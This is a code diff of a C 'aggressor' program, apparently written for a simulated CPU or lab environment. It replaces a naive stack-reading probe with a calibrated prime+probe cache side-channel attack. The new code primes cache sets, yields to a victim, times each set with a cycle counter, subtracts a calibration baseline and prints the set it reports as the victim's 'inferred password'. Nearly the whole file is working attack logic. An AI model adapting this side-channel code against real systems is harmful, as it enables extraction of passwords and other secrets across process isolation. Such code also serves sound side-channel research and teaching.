@@ -1,100 +1,183 @@
+#include <attack_layout.h>
 #include <builtin.h>
 #include <stdint.h>
 
-#define LINE_SIZE 64
-/* L3 is 8192 sets * 16 ways * 64 bytes = 8 MiB. Use 1 MiB buffer, 8 passes. */
-#define EVICTION_PASS_BYTES (1024 * 1024)
-#define EVICTION_PASSES 8
+#define PROBE_BUFFER_BYTES (((NUM_WAYS - 1U) * SET_STRIDE) + (NUM_SETS * LINE_SIZE))
+#define EVICTION_VARIANTS 4U
+#define TOP_SET_COUNT 3U
 
-#define VICTIM_STACK_TOP 0x300080U
-#define VICTIM_STACK_SIZE (1024 * 1024)
+static volatile unsigned char probe_buffers[EVICTION_VARIANTS][PROBE_BUFFER_BYTES]
+	__attribute__((aligned(SET_STRIDE)));
+static uint64_t baseline_scores[NUM_SETS] __attribute__((aligned(SET_STRIDE)));
+static uint64_t round_scores[NUM_SETS] __attribute__((aligned(SET_STRIDE)));
+static uint64_t total_disturbance[NUM_SETS];
+static uint64_t calibration_disturbance[NUM_SETS];
+static uint32_t disturbed_rounds[NUM_SETS];
+static volatile unsigned char probe_sink;
 
-static char eviction_buffer[EVICTION_PASS_BYTES] __attribute__((aligned(LINE_SIZE)));
+static volatile unsigned char *set_way_addr(uint32_t variant, uint32_t set, uint32_t way) {
+	return probe_buffers[variant] + (way * SET_STRIDE) + (set * LINE_SIZE);
+}
 
-static void prime(void) {
-	for (int pass = 0; pass < EVICTION_PASSES; pass++) {
-		for (int i = 0; i < sizeof(eviction_buffer); i += LINE_SIZE) {
-			(void)*(volatile char *)(eviction_buffer + i);
+static void prime_all_sets(uint32_t variant) {
+	for (uint32_t set = 0; set < NUM_SETS; set++) {
+		for (uint32_t way = 0; way < NUM_WAYS; way++) {
+			probe_sink ^= *set_way_addr(variant, set, way);
 		}
 	}
 }
 
-static void format_cache_line(uint32_t line_addr, char *buf) {
-	for (int i = 0; i < LINE_SIZE; i++) {
-		char b = *(volatile char *)(uintptr_t)(line_addr + i);
-		if ((b >= '0' && b <= '9') || (b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z')) {
-			buf[i] = b;
+static uint64_t probe_set(uint32_t variant, uint32_t set) {
+	uint64_t t0 = builtin_cycle_count();
+	for (uint32_t way = 0; way < NUM_WAYS; way++) {
+		probe_sink ^= *set_way_addr(variant, set, way);
+	}
+	uint64_t t1 = builtin_cycle_count();
+	return t1 - t0;
+}
+
+static uint32_t rotated_set(uint32_t start, uint32_t index) {
+	return (start + index) % NUM_SETS;
+}
+
+static void measure_round(uint32_t round) {
+	uint32_t variant = round % EVICTION_VARIANTS;
+	uint32_t start_set = (round * 17U) % NUM_SETS;
+
+	prime_all_sets(variant);
+	for (uint32_t i = 0; i < NUM_SETS; i++) {
+		uint32_t set = rotated_set(start_set, i);
+		baseline_scores[set] = probe_set(variant, set);
+	}
+
+	prime_all_sets(variant);
+	builtin_yield();
+
+	for (uint32_t i = 0; i < NUM_SETS; i++) {
+		uint32_t set = rotated_set(start_set, i);
+		uint64_t after = probe_set(variant, set);
+		round_scores[set] = after > baseline_scores[set] ? after - baseline_scores[set] : 0;
+	}
+}
+
+static void record_round(uint64_t *totals) {
+	uint64_t total = 0;
+
+	for (uint32_t set = 0; set < NUM_SETS; set++) {
+		total += round_scores[set];
+	}
+
+	uint64_t average = total / NUM_SETS;
+
+	for (uint32_t set = 0; set < NUM_SETS; set++) {
+		totals[set] += round_scores[set];
+		if (totals == total_disturbance && round_scores[set] > average) {
+			disturbed_rounds[set]++;
+		}
+	}
+}
+
+static void clear_attack_scores(void) {
+	for (uint32_t set = 0; set < NUM_SETS; ++set) {
+		total_disturbance[set] = 0;
+		disturbed_rounds[set] = 0;
+	}
+}
+
+static uint32_t hottest_set(void) {
+	uint32_t best_set = 0;
+	uint32_t best_rounds = disturbed_rounds[0];
+	uint64_t best_total = total_disturbance[0];
+
+	for (uint32_t set = 1; set < NUM_SETS; set++) {
+		if (disturbed_rounds[set] > best_rounds) {
+			best_set = set;
+			best_rounds = disturbed_rounds[set];
+			best_total = total_disturbance[set];
+			continue;
+		}
+		if (disturbed_rounds[set] == best_rounds && total_disturbance[set] > best_total) {
+			best_set = set;
+			best_total = total_disturbance[set];
+		}
+	}
+
+	return best_set;
+}
+
+static void report_top_sets(void) {
+	uint32_t top_sets[TOP_SET_COUNT] = {0, 0, 0};
+	uint64_t top_scores[TOP_SET_COUNT] = {0, 0, 0};
+
+	for (uint32_t set = 0; set < NUM_SETS; set++) {
+		uint64_t score = total_disturbance[set];
+
+		for (uint32_t i = 0; i < TOP_SET_COUNT; i++) {
+			if (score > top_scores[i]) {
+				for (uint32_t j = TOP_SET_COUNT - 1; j > i; j--) {
+					top_scores[j] = top_scores[j - 1];
+					top_sets[j] = top_sets[j - 1];
+				}
+				top_scores[i] = score;
+				top_sets[i] = set;
+				break;
+			}
+		}
+	}
+
+	for (uint32_t i = 0; i < TOP_SET_COUNT; i++) {
+		uint32_t set = top_sets[i];
+		builtin_printf(
+			"aggressor: disturbed rank %d set=%d rounds=%d total_delta=%d",
+			(int)(i + 1U),
+			(int)set,
+			(int)disturbed_rounds[set],
+			(int)total_disturbance[set]
+		);
+	}
+}
+
+static void run_attack(void) {
+	for (uint32_t round = 0; round < CALIBRATION_ROUNDS; round++) {
+		measure_round(round);
+		record_round(calibration_disturbance);
+	}
+
+	clear_attack_scores();
+
+	for (uint32_t round = 0; round < ATTACK_ROUNDS; round++) {
+		measure_round(round);
+		record_round(total_disturbance);
+	}
+
+	for (uint32_t set = 0; set < NUM_SETS; ++set) {
+		uint64_t base = calibration_disturbance[set];
+		if (total_disturbance[set] > base) {
+			total_disturbance[set] -= base;
 		} else {
-			buf[i] = '.';
+			total_disturbance[set] = 0;
+			disturbed_rounds[set] = 0;
 		}
 	}
-	buf[LINE_SIZE] = '\0';
 }
 
-static void probe(void) {
-	uint32_t fastest_line = 0;
-	uint64_t min_cycles = UINT64_MAX;
-	uint32_t second_fastest_line = 0;
-	uint64_t second_min_cycles = UINT64_MAX;
-	uint32_t third_fastest_line = 0;
-	uint64_t third_min_cycles = UINT64_MAX;
+static void report_inference(void) {
+	uint32_t secret_set = hottest_set();
 
-	for (uint32_t addr = VICTIM_STACK_TOP; addr >= VICTIM_STACK_TOP - VICTIM_STACK_SIZE; addr -= LINE_SIZE) {
-		uint64_t t0 = builtin_cycle_count();
-		(void)*(volatile uint32_t *)addr;
-		uint64_t t1 = builtin_cycle_count();
+	builtin_printf("aggressor: inferred password set=%d", (int)secret_set);
 
-		uint64_t delta = t1 - t0;
-		if (delta < min_cycles) {
-			third_min_cycles = second_min_cycles;
-			third_fastest_line = second_fastest_line;
-			second_min_cycles = min_cycles;
-			second_fastest_line = fastest_line;
-			min_cycles = delta;
-			fastest_line = addr;
-		} else if (delta < second_min_cycles) {
-			second_min_cycles = delta;
-			second_fastest_line = addr;
-		} else if (delta < third_min_cycles) {
-			third_min_cycles = delta;
-			third_fastest_line = addr;
-		}
-	}
-
-	builtin_printf("aggressor: fastest cache line: %d (%d cycles)", (int)fastest_line, (int)min_cycles);
-	builtin_printf("aggressor: second fastest cache line: %d (%d cycles)", (int)second_fastest_line, (int)second_min_cycles);
-	builtin_printf("aggressor: third fastest cache line: %d (%d cycles)", (int)third_fastest_line, (int)third_min_cycles);
-
-	static char buf[LINE_SIZE + 1];
-	format_cache_line(fastest_line, buf);
-	builtin_printf("aggressor: cache line contents: %s", buf);
-	format_cache_line(second_fastest_line, buf);
-	builtin_printf("aggressor: second cache line contents: %s", buf);
-	format_cache_line(third_fastest_line, buf);
-	builtin_printf("aggressor: third cache line contents: %s", buf);
+	report_top_sets();
 }
 
 int main(void) {
 	builtin_printf("aggressor: start");
+	builtin_printf("aggressor: waiting for victim setup");
+	builtin_yield();
 
-	for (int i = 0; i < 3; i++) {
-		builtin_printf("aggressor: yielding to victim", i);
-		builtin_yield();
-	}
+	run_attack();
 
-	builtin_printf("aggressor: priming");
-	prime();
-	builtin_printf("aggressor: primed");
-
-	for (int i = 0; i < 3; i++) {
-		builtin_printf("aggressor: yielding to victim", i);
-		builtin_yield();
-	}
-
-	builtin_printf("aggressor: probing");
-	probe();
-	builtin_printf("aggressor: probed");
-
+	builtin_printf("aggressor: attack complete");
+	report_inference();
 	builtin_printf("aggressor: done");
 
 	return 0;
